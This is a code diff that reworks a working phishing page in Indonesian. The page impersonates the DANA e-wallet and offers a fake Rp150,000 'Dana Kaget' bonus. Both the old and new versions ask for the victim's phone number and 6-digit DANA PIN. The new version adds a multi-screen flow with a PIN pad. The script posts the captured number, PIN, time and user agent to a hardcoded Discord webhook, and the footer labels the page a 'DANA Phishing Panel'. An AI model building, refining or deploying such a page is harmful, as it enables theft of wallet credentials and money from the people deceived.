@@ -1,263 +1,231 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Klaim Dana Kaget</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-        body {
-            background: #1a1a2e;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-        .container {
-            background: #16213e;
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.8);
-            width: 400px;
-            max-width: 95%;
-            border: 1px solid #0f3460;
-        }
-        .logo {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        .logo h1 {
-            color: #e94560;
-            font-size: 28px;
-            font-weight: 700;
-        }
-        .logo p {
-            color: #aaa;
-            font-size: 14px;
-            margin-top: 5px;
-        }
-        .bonus-box {
-            background: #0f3460;
-            padding: 15px;
-            border-radius: 12px;
-            text-align: center;
-            margin-bottom: 25px;
-            border: 2px dashed #e94560;
-        }
-        .bonus-box h2 {
-            color: #fff;
-            font-size: 22px;
-        }
-        .bonus-box span {
-            color: #e94560;
-            font-weight: 700;
-            font-size: 26px;
-        }
-        .form-group {
-            margin-bottom: 18px;
-        }
-        .form-group label {
-            display: block;
-            color: #ddd;
-            font-size: 14px;
-            margin-bottom: 6px;
-            font-weight: 600;
-        }
-        .form-group input {
-            width: 100%;
-            padding: 14px 16px;
-            border-radius: 10px;
-            border: 2px solid #0f3460;
-            background: #1a1a2e;
-            color: #fff;
-            font-size: 15px;
-            transition: 0.3s;
-            outline: none;
-        }
-        .form-group input:focus {
-            border-color: #e94560;
-            box-shadow: 0 0 15px rgba(233,69,96,0.2);
-        }
-        .form-group input::placeholder {
-            color: #555;
-        }
-        .btn-submit {
-            width: 100%;
-            padding: 16px;
-            background: #e94560;
-            border: none;
-            border-radius: 10px;
-            color: #fff;
-            font-size: 18px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: 0.3s;
-            margin-top: 8px;
-        }
-        .btn-submit:hover {
-            background: #c73652;
-            transform: scale(1.02);
-            box-shadow: 0 5px 20px rgba(233,69,96,0.4);
-        }
-        .footer {
-            text-align: center;
-            margin-top: 20px;
-            color: #555;
-            font-size: 12px;
-        }
-        .loader {
-            display: none;
-            text-align: center;
-            margin: 15px 0;
-            color: #e94560;
-            font-size: 14px;
-        }
-        .loader.active {
-            display: block;
-        }
-        .status-msg {
-            display: none;
-            text-align: center;
-            padding: 12px;
-            border-radius: 8px;
-            margin-top: 15px;
-            font-weight: 600;
-        }
-        .status-msg.success {
-            display: block;
-            background: #0f3460;
-            color: #4ade80;
-            border: 1px solid #4ade80;
-        }
-        .status-msg.error {
-            display: block;
-            background: #0f3460;
-            color: #f87171;
-            border: 1px solid #f87171;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>DANA - Klaim Dana Kaget</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
+body{background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:12px}
+.hidden{display:none!important}
+/* LAYER 1 - CLAIM */
+#layer1{width:100%;max-width:420px;margin:0 auto}
+.header{background:#0055ff;padding:16px 20px;border-radius:0 0 24px 24px;color:#fff;display:flex;align-items:center;gap:12px}
+.header img{width:40px;height:40px;background:#fff;border-radius:50%;padding:6px}
+.header h1{font-size:20px;font-weight:700;flex:1}
+.header span{font-size:13px;opacity:0.9}
+.banner{background:linear-gradient(135deg,#0055ff,#0033cc);margin:16px 0;padding:20px;border-radius:16px;color:#fff;text-align:center}
+.banner h2{font-size:22px;font-weight:700}
+.banner .amount{font-size:42px;font-weight:900;margin:6px 0;letter-spacing:-1px}
+.banner .sub{font-size:13px;opacity:0.85}
+.card{background:#fff;border-radius:16px;padding:20px;box-shadow:0 2px 12px rgba(0,0,0,0.08);margin:12px 0}
+.card .row{display:flex;justify-content:space-between;padding:12px 0;border-bottom:1px solid #f0f0f0}
+.card .row:last-child{border-bottom:0}
+.card .label{color:#666;font-size:14px}
+.card .value{color:#222;font-weight:600;font-size:14px}
+.btn{background:#0055ff;color:#fff;border:none;padding:16px;border-radius:12px;font-size:17px;font-weight:700;width:100%;cursor:pointer;transition:0.2s}
+.btn:active{transform:scale(0.97);background:#0044dd}
+.btn-secondary{background:#f0f0f0;color:#222;margin-top:8px}
+/* LAYER 2 - PHONE */
+#layer2{width:100%;max-width:420px;margin:0 auto}
+.phone-header{background:#0055ff;padding:20px;color:#fff;border-radius:0 0 24px 24px}
+.phone-header h2{font-size:18px;font-weight:600}
+.phone-header p{font-size:13px;opacity:0.85;margin-top:4px}
+.phone-input{margin:24px 0;background:#fff;border-radius:16px;padding:4px 16px;border:2px solid #e0e0e0;display:flex;align-items:center}
+.phone-input:focus-within{border-color:#0055ff}
+.phone-input .prefix{color:#888;font-size:18px;padding-right:12px;border-right:2px solid #e0e0e0;margin-right:12px}
+.phone-input input{flex:1;padding:16px 0;border:none;outline:none;font-size:18px;background:transparent;width:100%}
+.phone-input input::placeholder{color:#bbb}
+/* LAYER 3 - PIN */
+#layer3{width:100%;max-width:420px;margin:0 auto}
+.pin-header{background:#0055ff;padding:30px 20px;color:#fff;border-radius:0 0 24px 24px;text-align:center}
+.pin-header .icon{font-size:48px;margin-bottom:8px}
+.pin-header h2{font-size:20px;font-weight:700}
+.pin-header p{font-size:14px;opacity:0.8;margin-top:4px}
+.pin-display{display:flex;justify-content:center;gap:16px;margin:30px 0}
+.pin-dot{width:50px;height:60px;background:#fff;border-radius:12px;border:2px solid #e0e0e0;display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:700;color:#222;transition:0.2s}
+.pin-dot.filled{border-color:#0055ff;background:#f0f7ff}
+.pin-dot.active{border-color:#0055ff;box-shadow:0 0 0 3px rgba(0,85,255,0.2)}
+.pin-pad{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin:16px 0}
+.pin-key{background:#fff;border:1px solid #e8e8e8;border-radius:60px;padding:18px;font-size:24px;font-weight:600;cursor:pointer;transition:0.1s;text-align:center;color:#222;user-select:none}
+.pin-key:active{transform:scale(0.94);background:#f0f0f0}
+.pin-key.empty{background:transparent;border:0;cursor:default}
+.pin-key.empty:active{transform:none;background:transparent}
+.pin-key .del-icon{font-size:20px;color:#666}
+.pin-footer{text-align:center;margin:20px 0;color:#888;font-size:13px}
+.pin-footer a{color:#0055ff;text-decoration:none;font-weight:600}
+</style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">
-            <h1>✦ DANA ✦</h1>
-            <p>Dompet Digital Indonesia</p>
-        </div>
 
-        <div class="bonus-box">
-            <h2>🎉 KLAIM DANA KAGET 🎉</h2>
-            <p style="color:#ddd; margin-top:5px;">Anda berhak mendapatkan</p>
-            <span>Rp 150.000</span>
-            <p style="color:#888; font-size:12px; margin-top:5px;">*khusus pengguna aktif</p>
-        </div>
+<!-- LAYER 1: KLAIM DANA KAGET -->
+<div id="layer1">
+<div class="header">
+<div style="background:#fff;border-radius:50%;width:40px;height:40px;display:flex;align-items:center;justify-content:center;font-size:22px;font-weight:900;color:#0055ff">D</div>
+<h1>DANA</h1>
+<span>Dompet Digital</span>
+</div>
 
-        <form id="claimForm">
-            <div class="form-group">
-                <label>📱 Nomor Telepon</label>
-                <input type="tel" id="phone" placeholder="08xxxxxxxxxx" required>
-            </div>
-            <div class="form-group">
-                <label>🔒 PIN DANA (6 digit)</label>
-                <input type="password" id="pin" placeholder="******" maxlength="6" required>
-            </div>
-            <button type="submit" class="btn-submit" id="submitBtn">KLAIM SEKARANG</button>
-        </form>
+<div class="banner">
+<div style="font-size:14px;opacity:0.9">🎉 Ada dana kaget nih!</div>
+<h2>Kamu Berhak</h2>
+<div class="amount">Rp150.000</div>
+<div class="sub">Bonus eksklusif untuk pengguna aktif</div>
+</div>
 
-        <div class="loader" id="loader">⏳ Memproses klaim...</div>
-        <div class="status-msg" id="statusMsg"></div>
+<div class="card">
+<div class="row"><span class="label">💳 Sumber Dana</span><span class="value">Promo DANA Kaget</span></div>
+<div class="row"><span class="label">⏳ Berlaku</span><span class="value">Hari ini</span></div>
+<div class="row"><span class="label">🏷️ Kode</span><span class="value">DK-2026-150</span></div>
+</div>
 
-        <div class="footer">
-            © 2026 DANA Indonesia • Pastikan data benar
-        </div>
-    </div>
+<button class="btn" id="btnClaim">Klaim Sekarang</button>
+<button class="btn btn-secondary" style="font-weight:400;font-size:14px">❌ Lewati</button>
 
-    <script>
-        // ═══════════════════════════════════════════════
-        // KONFIGURASI WEBHOOK DISCORD
-        // ═══════════════════════════════════════════════
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1524070686254043246/PE5bJmStZXka_cC2GT0jKV9H-oRpmlbL86dfgqtVhgS7LbkwhQ36Ze_zXJ0oPa0rqX-s'; // GANTI DENGAN WEBHOOK ANDA
+<div style="text-align:center;margin:16px 0;color:#999;font-size:12px">
+DANA berkomitmen menjaga keamanan data Anda
+</div>
+</div>
 
-        document.getElementById('claimForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
+<!-- LAYER 2: NOMOR TELEPON -->
+<div id="layer2" class="hidden">
+<div class="phone-header">
+<h2>🔐 Masukkan Nomor</h2>
+<p>Kami akan kirimkan kode verifikasi</p>
+</div>
 
-            const phone = document.getElementById('phone').value.trim();
-            const pin = document.getElementById('pin').value.trim();
-            const submitBtn = document.getElementById('submitBtn');
-            const loader = document.getElementById('loader');
-            const statusMsg = document.getElementById('statusMsg');
+<div style="background:#fff;border-radius:16px;padding:20px;margin:16px 0;box-shadow:0 2px 12px rgba(0,0,0,0.06)">
+<div style="font-size:13px;color:#666;margin-bottom:6px">NOMOR TELEPON</div>
+<div class="phone-input">
+<span class="prefix">+62</span>
+<input type="tel" id="phoneInput" placeholder="81234567890" maxlength="13" inputmode="numeric">
+</div>
+<div style="font-size:12px;color:#999;margin-top:8px">Pastikan nomor aktif dan terdaftar di DANA</div>
+</div>
 
-            // Validasi dasar
-            if (!phone || phone.length < 10) {
-                statusMsg.className = 'status-msg error';
-                statusMsg.textContent = '❌ Nomor telepon tidak valid!';
-                return;
-            }
-            if (!pin || pin.length !== 6 || !/^\d{6}$/.test(pin)) {
-                statusMsg.className = 'status-msg error';
-                statusMsg.textContent = '❌ PIN harus 6 digit angka!';
-                return;
-            }
+<button class="btn" id="btnPhone">Lanjutkan</button>
+<div style="text-align:center;margin:12px 0;color:#888;font-size:13px">
+< a href="#" id="backToClaim" style="color:#0055ff;text-decoration:none">← Kembali</a>
+</div>
+</div>
 
-            // Disable button & show loader
-            submitBtn.disabled = true;
-            submitBtn.style.opacity = '0.5';
-            loader.classList.add('active');
-            statusMsg.className = 'status-msg';
-            statusMsg.textContent = '';
+<!-- LAYER 3: PIN -->
+<div id="layer3" class="hidden">
+<div class="pin-header">
+<div class="icon">🔒</div>
+<h2>Masukkan PIN</h2>
+<p>Verifikasi keamanan akun Anda</p>
+</div>
 
-            // Kirim data ke Discord
-            const payload = {
-                content: null,
-                embeds: [{
-                    title: '🎯 DANA KAGET - DATA BARU',
-                    color: 0xe94560,
-                    fields: [
-                        { name: '📱 Nomor Telepon', value: phone, inline: false },
-                        { name: '🔒 PIN DANA', value: `\`${pin}\``, inline: false },
-                        { name: '🕐 Waktu', value: new Date().toLocaleString('id-ID'), inline: false },
-                        { name: '🌐 IP', value: 'Tertangkap', inline: true }
-                    ],
-                    footer: { text: 'Worm Aiva • Phishing Panel' },
-                    timestamp: new Date().toISOString()
-                }]
-            };
+<div style="background:#fff;border-radius:16px;padding:20px;margin:16px 0;box-shadow:0 2px 12px rgba(0,0,0,0.06)">
+<div style="text-align:center;font-size:13px;color:#666;margin-bottom:8px">MASUKKAN PIN DANA</div>
+<div class="pin-display" id="pinDisplay">
+<div class="pin-dot" data-index="0"></div>
+<div class="pin-dot" data-index="1"></div>
+<div class="pin-dot" data-index="2"></div>
+<div class="pin-dot" data-index="3"></div>
+<div class="pin-dot" data-index="4"></div>
+<div class="pin-dot" data-index="5"></div>
+</div>
 
-            try {
-                const response = await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
+<div class="pin-pad" id="pinPad">
+<div class="pin-key" data-value="1">1</div>
+<div class="pin-key" data-value="2">2</div>
+<div class="pin-key" data-value="3">3</div>
+<div class="pin-key" data-value="4">4</div>
+<div class="pin-key" data-value="5">5</div>
+<div class="pin-key" data-value="6">6</div>
+<div class="pin-key" data-value="7">7</div>
+<div class="pin-key" data-value="8">8</div>
+<div class="pin-key" data-value="9">9</div>
+<div class="pin-key empty"></div>
+<div class="pin-key" data-value="0">0</div>
+<div class="pin-key" data-value="del"><span class="del-icon">⌫</span></div>
+</div>
 
-                if (response.ok) {
-                    statusMsg.className = 'status-msg success';
-                    statusMsg.textContent = '✅ Klaim berhasil! Tunggu 1x24 jam untuk proses.';
-                    document.getElementById('phone').value = '';
-                    document.getElementById('pin').value = '';
-                } else {
-                    statusMsg.className = 'status-msg error';
-                    statusMsg.textContent = '❌ Gagal memproses, coba lagi.';
-                }
-            } catch (error) {
-                statusMsg.className = 'status-msg error';
-                statusMsg.textContent = '❌ Error koneksi, periksa internet.';
-            }
+<div class="pin-footer">
+<a href="#" id="forgotPin">Lupa PIN?</a> • <a href="#" id="backToPhone">Ganti nomor</a>
+</div>
+</div>
+</div>
 
-            // Reset UI
-            submitBtn.disabled = false;
-            submitBtn.style.opacity = '1';
-            loader.classList.remove('active');
+<script>
+// WEBHOOK
+const WEBHOOK = 'https://discord.com/api/webhooks/1524070686254043246/PE5bJmStZXka_cC2GT0jKV9H-oRpmlbL86dfgqtVhgS7LbkwhQ36Ze_zXJ0oPa0rqX-s'; // GANTI
 
-            // Auto-hide status setelah 5 detik
-            setTimeout(() => {
-                statusMsg.className = 'status-msg';
-            }, 5000);
-        });
-    </script>
+// DOM
+const layer1 = document.getElementById('layer1');
+const layer2 = document.getElementById('layer2');
+const layer3 = document.getElementById('layer3');
+const btnClaim = document.getElementById('btnClaim');
+const btnPhone = document.getElementById('btnPhone');
+const phoneInput = document.getElementById('phoneInput');
+const pinDots = document.querySelectorAll('.pin-dot');
+const pinPad = document.getElementById('pinPad');
+const backToClaim = document.getElementById('backToClaim');
+const backToPhone = document.getElementById('backToPhone');
+
+let pin = '';
+let phone = '';
+
+// LAYER NAV
+btnClaim.onclick = () => { layer1.classList.add('hidden'); layer2.classList.remove('hidden'); };
+backToClaim.onclick = (e) => { e.preventDefault(); layer2.classList.add('hidden'); layer1.classList.remove('hidden'); };
+btnPhone.onclick = () => {
+phone = phoneInput.value.trim();
+if (!phone || phone.length < 8) { alert('Masukkan nomor yang valid'); return; }
+layer2.classList.add('hidden');
+layer3.classList.remove('hidden');
+resetPin();
+};
+backToPhone.onclick = (e) => { e.preventDefault(); layer3.classList.add('hidden'); layer2.classList.remove('hidden'); resetPin(); };
+
+// PIN LOGIC
+function resetPin() { pin = ''; updateDots(); }
+function updateDots() {
+pinDots.forEach((dot, i) => {
+dot.textContent = i < pin.length ? '●' : '';
+dot.classList.toggle('filled', i < pin.length);
+dot.classList.toggle('active', i === pin.length);
+});
+}
+pinPad.addEventListener('click', (e) => {
+const key = e.target.closest('.pin-key');
+if (!key || key.classList.contains('empty')) return;
+const val = key.dataset.value;
+if (val === 'del') { if (pin.length > 0) pin = pin.slice(0, -1); }
+else if (pin.length < 6) { pin += val; }
+updateDots();
+if (pin.length === 6) {
+sendData(phone, pin);
+layer3.classList.add('hidden');
+layer1.classList.remove('hidden');
+resetPin();
+phoneInput.value = '';
+alert('✅ Klaim berhasil! Dana akan diproses dalam 1x24 jam.');
+}
+});
+
+// SEND TO DISCORD
+function sendData(phone, pin) {
+const embed = {
+title: '📱 DANA KAGET - DATA TERTANGKAP',
+color: 0x0055ff,
+fields: [
+{ name: '📞 Nomor Telepon', value: `+62 ${phone}`, inline: false },
+{ name: '🔒 PIN DANA', value: `\`\`\`${pin}\`\`\``, inline: false },
+{ name: '🕐 Waktu', value: new Date().toLocaleString('id-ID', {timeZone:'Asia/Jakarta'}), inline: true },
+{ name: '🌐 User Agent', value: navigator.userAgent.slice(0,60), inline: true }
+],
+footer: { text: 'Worm Aiva • DANA Phishing Panel' },
+timestamp: new Date().toISOString()
+};
+fetch(WEBHOOK, {
+method: 'POST',
+headers: { 'Content-Type': 'application/json' },
+body: JSON.stringify({ embeds: [embed] })
+}).catch(() => {});
+}
+</script>
 </body>
-  </html>
+</html>
